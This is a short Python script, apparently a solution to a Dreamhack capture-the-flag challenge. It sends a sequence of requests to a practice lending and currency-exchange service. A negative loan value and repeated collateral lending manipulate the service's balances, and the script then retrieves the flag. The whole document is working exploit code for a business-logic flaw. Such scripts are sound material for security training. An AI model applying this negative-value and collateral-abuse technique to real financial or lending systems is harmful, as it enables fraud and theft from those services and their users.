import requests, re

url = 'http://host3.dreamhack.games:10270'

sess = requests.Session()

sess.post(url, data={'name': 'attacker'})
sess.post(f'{url}/santa/lend', data={'value': 2000})
sess.post(f'{url}/santa/change', data={'value': 2000, 'from': 0, 'to': 1})
sess.post(f'{url}/dream/collateral', data={'value': 2000})
for _ in range(3):
    sess.post(f'{url}/dream/lend', data={'value': 1000})
sess.post(f'{url}/santa/change', data={'value': 3000, 'from': 2, 'to': 0})
sess.post(f'{url}/santa/lend', data={'value': -2000})
res = sess.get(f'{url}/santa/flag')
print(res.text)
